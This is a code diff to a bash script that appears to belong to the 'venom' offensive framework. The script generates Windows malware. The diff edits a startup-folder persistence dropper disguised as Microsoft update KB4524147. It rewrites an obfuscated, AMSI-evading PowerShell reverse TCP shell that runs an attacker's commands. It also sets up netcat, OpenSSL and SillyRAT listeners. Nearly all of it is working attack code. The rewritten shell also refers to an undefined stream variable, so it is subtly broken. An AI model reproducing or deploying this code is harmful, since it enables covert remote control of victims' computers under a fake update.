@@ -10350,6 +10350,7 @@ if [ "$SOSP" = "Windows" ]; then
          echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
          echo "echo Powershell -w 1 cd $wvd;python $Drop.py >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
          echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $Drop.bat
+         echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.bat ..${white}";sleep 2
       fi
       echo "@c%@$%d $rpath &%@%& =pY%@%t^H%@%o\"N\" $Drop.%\$i%" >> $Drop.bat
       echo "=Exit" >> $Drop.bat
@@ -10532,20 +10533,20 @@ cd $IPATH
 sleep 2
 
 
-dtr=$(date|awk {'print $1,$2,$3,$4'})
+dtr=$(date|awk {'print $2,$3,$4,$5'})
 if [ "$persistence" = "Add persistence" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LPORT    : $lport" > $IPATH/output/persistence.handler
-   echo "LHOST    : $lhost" >> $IPATH/output/persistence.handler
-   echo "ACTIVE_ON: $dtr" >> $IPATH/output/persistence.handler
-   echo "HANDLER  : cd bin/SillyRAT && service apache2 start" >> $IPATH/output/persistence.handler
-   echo "HANDLER  : python3 server.py bind --address 0.0.0.0 --port $lport" >> $IPATH/output/persistence.handler
-   echo "+-----------------------------------------+" >> $IPATH/output/persistence.handler
-   echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence.handler
-   echo "+-----------------------------------------+" >> $IPATH/output/persistence.handler
-   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence.handler
-   echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $IPATH/output/persistence.handler
-   zenity --title="☠ SillyRAT persistence ☠" --text "Settings related to persistence stored under:\n$IPATH/output/persistence.handler" --info --width 305 --height 130 > /dev/null 2>&1
+   echo "LPORT    : $lport" > $IPATH/output/persistence_ID_$random_name.handler
+   echo "LHOST    : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "DATE     : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER  : cd bin/SillyRAT && service apache2 start" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER  : python3 server.py bind --address 0.0.0.0 --port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "|DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147.update.bat\"" >> $IPATH/output/persistence_ID_$random_name.handler
+   zenity --title="☠ SillyRAT persistence ☠" --text "Settings related to persistence stored under:\n$IPATH/output/persistence_ID_$random_name.handler" --info --width 340 --height 130 > /dev/null 2>&1
 fi
 
 
@@ -12771,7 +12772,6 @@ cat << !
     DROPPER  : $IPATH/output/$Drop.bat
     AGENT    : $IPATH/output/$NaM.ps1
     UPLOADTO : $rpath => ($wvd)
-    SILENT PERSISTENCE : $easter_egg
 !
 echo "---"
 
@@ -12917,7 +12917,7 @@ rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START HANDLER
 cd $IPATH/output
 xterm -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
-dtr=$(date|awk {'print $1,$2,$3,$4'})
+dtr=$(date|awk {'print $2,$3,$4,$5'})
 cd $IPATH
 sleep 2
 
@@ -12934,24 +12934,23 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 
 
 ## Remark related to 'persistence' function..
-if [ "$persistence" = "Add persistence)" ]; then
+if [ "$persistence" = "Add persistence" ]; then
    ## Write how to delete persistence to output folder ..
    echo "LPORT    :$lport" > $IPATH/output/persistence_ID_$random_name.handler
    echo "LHOST    :$lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "ACTIVE_ON:$dtr" >> $IPATH/output/persistence_ID_$random_nafme.handler
+   echo "DATE     :$dtr" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "HANDLER  :cd output" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "HANDLER  :sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "|DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
    else
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/persistence_ID_$random_name.handler
    fi
-   echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/persistence_ID_$random_name.handler
-   zenity --title="☠ Reverse TCP Powershell Shell (OpenSSL) ☠" --text "Settings related to persistence stored under:\n$IPATH/output/persistence_ID_$random_name.handler" --info --width 320 --height 130 > /dev/null 2>&1
+   zenity --title="☠ Reverse TCP Powershell Shell (OpenSSL) ☠" --text "Settings related to persistence stored under:\n$IPATH/output/persistence_ID_$random_name.handler" --info --width 340 --height 130 > /dev/null 2>&1
 else
    ## Only delete certs' IF persitence was NOT sellected.
    rm $IPATH/output/cert.pem > /dev/nul 2>&1
@@ -12986,15 +12985,15 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %LocalAppData% (*)\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
 
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$NaM" ]; then NaM="Security-Update";fi
 if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
-if [ -z "$rpath" ]; then rpath="%LocalAppData%";fi
 
 
 ## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn7.update }
@@ -13025,7 +13024,6 @@ cat << !
     DROPPER  : $IPATH/output/$Drop.$ext.bat
     AGENT    : $IPATH/output/$NaM.ps1
     UPLOADTO : $rpath => ($wvd)
-    SILENT PERSISTENCE : $easter_egg
 !
 echo "---"
 
@@ -13071,7 +13069,7 @@ else
       echo "echo :: Framework: venom v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
@@ -13107,7 +13105,28 @@ echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: Paranoid Ninja" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"> \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 3}" >> $IPATH/output/$NaM.ps1
+echo "while (\$true) {" >> $IPATH/output/$NaM.ps1
+echo "   \$pxhex = $hexed;" >> $IPATH/output/$NaM.ps1
+echo "   \$pass = (\$pxhex | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';" >> $IPATH/output/$NaM.ps1
+echo "   \$wua = \"GET /index.html HTTP/1.1\`r\`nHost: \$pass\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";" >> $IPATH/output/$NaM.ps1
+echo "   \$slui = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
+echo "   \$xuxa = \"n-eiorvsxpk5\";" >> $IPATH/output/$NaM.ps1
+echo "   Set-alias \$xuxa (\$xuxa[\$true-10] + (\$xuxa[[byte](\"0x\" + \"FF\") - 265]) + \$xuxa[[byte](\"0x\" + \"9a\") - 158]);" >> $IPATH/output/$NaM.ps1
+echo "   \$yat = New-Object System.Net.Sockets.TCPClient(\$pass,$lport);" >> $IPATH/output/$NaM.ps1
+echo "   \$zzz = \$yat.GetStream();" >> $IPATH/output/$NaM.ps1
+echo "   \$data = \$slui::UTF8.GetBytes(\$wua);" >> $IPATH/output/$NaM.ps1
+echo "   \$zzz.Write(\$data, 0, \$data.Length);" >> $IPATH/output/$NaM.ps1
+echo "   \$trash = (n-eiorvsxpk5 whoami) + \"> \";" >> $IPATH/output/$NaM.ps1
+echo "" >> $IPATH/output/$NaM.ps1
+echo "Start-Sleep -Milliseconds 300" >> $IPATH/output/$NaM.ps1
+echo "while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;" >> $IPATH/output/$NaM.ps1
+echo "   \$value = (New-Object -TypeName \$slui).GetString(\$b,0, \$l);" >> $IPATH/output/$NaM.ps1
+echo "   \$data = \$slui::UTF8.GetBytes((n-eiorvsxpk5 \$value 2>&1 | Out-String )) + \$slui::UTF8.GetBytes(\$trash);" >> $IPATH/output/$NaM.ps1
+echo "   \$zzz.Write(\$data, 0, \$data.Length);" >> $IPATH/output/$NaM.ps1
+echo "}" >> $IPATH/output/$NaM.ps1
+echo "\$yat.Close();" >> $IPATH/output/$NaM.ps1
+echo "Start-Sleep -Milliseconds 200" >> $IPATH/output/$NaM.ps1
+echo "}" >> $IPATH/output/$NaM.ps1
 
 
 ## Building the Download Webpage Sellected.
@@ -13153,7 +13172,7 @@ rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START NETCAT HANDLER ON SELLECTED PORT NUMBER
 cd $IPATH/output
 xterm -T " NETCAT LISTENER => $lhost:$lport" -geometry 110x23 -e "sudo nc -lvvp $lport"
-dtr=$(date|awk {'print $1,$2,$3,$4'})
+dtr=$(date|awk {'print $2,$3,$4,$5'})
 cd $IPATH
 sleep 2
 
@@ -13170,23 +13189,22 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 
 
 ## Remark related to 'persistence' function..
-if [ "$persistence" = "Add persistence)" ]; then
+if [ "$persistence" = "Add persistence" ]; then
    ## Write how to delete persistence to output folder ..
    echo "LPORT    :$lport" > $IPATH/output/persistence_ID_$random_name.handler
    echo "LHOST    :$lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "ACTIVE_ON:$dtr" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "DATE     :$dtr" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "HANDLER  :sudo nc -lvvp $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "+-----------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "|DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "+--------------------------------------+" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
    else
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/persistence_ID_$random_name.handler
    fi
-   echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/persistence_ID_$random_name.handler
-   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "Settings related to persistence stored under:\n$IPATH/output/persistence_ID_$random_name.handler" --info --width 320 --height 130 > /dev/null 2>&1
+   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "Settings related to persistence stored under:\n$IPATH/output/persistence_ID_$random_name.handler" --info --width 340 --height 130 > /dev/null 2>&1
 fi
 sh_menu
 }
@@ -13288,7 +13306,7 @@ else
   sed -i "s|$set_port|$lport|" Settings.txt
   sed -i "s|$set_obfs|$Obtype|" Settings.txt
   ## Run meterpeter binary (ps1)
-  dtr=$(date|awk {'print $1,$2,$3,$4'})
+  dtr=$(date|awk {'print $2,$3,$4,$5'})
   echo "${BlueF}[☠]${white} [${YellowF}$dtr${white}] Runing meterpeter Framework .."${Reset};sleep 2
   # gnome-terminal --title "meterpeter (Server)" --window --maximize -x bash -c 'pwsh -File meterpeter.ps1'
   pwsh -File meterpeter.ps1
@@ -13305,11 +13323,11 @@ if [ -e "$IPATH/bin/meterpeter/Update-KB4524147.ps1" ]; then
    echo "+----------------------------------+" > $IPATH/output/meterpeter_$random_name.handler
    echo "| meterpeter - Persistence Handler |" >> $IPATH/output/meterpeter_$random_name.handler
    echo "+----------------------------------+" >> $IPATH/output/meterpeter_$random_name.handler
-   echo "SILENT:OFF" >> $IPATH/output/meterpeter_$random_name.handler
-   echo "LPORT:$lport" >> $IPATH/output/meterpeter_$random_name.handler
-   echo "LHOST:$lhost" >> $IPATH/output/meterpeter_$random_name.handler
-   echo "HANDLER:sudo nc -lvp $lport" >> $IPATH/output/meterpeter_$random_name.handler
-   echo "ACTIVE_ON=$dtr" >> $IPATH/output/meterpeter_$random_name.handler
+   echo "LPORT  :$lport" >> $IPATH/output/meterpeter_$random_name.handler
+   echo "LHOST  :$lhost" >> $IPATH/output/meterpeter_$random_name.handler
+   echo "DATE   :$dtr" >> $IPATH/output/meterpeter_$random_name.handler
+   echo "HANDLER:cd output" >> $IPATH/output/meterpeter_$random_name.handler
+   echo "HANDLER:sudo nc -lvvp $lport" >> $IPATH/output/meterpeter_$random_name.handler
 fi
 
 
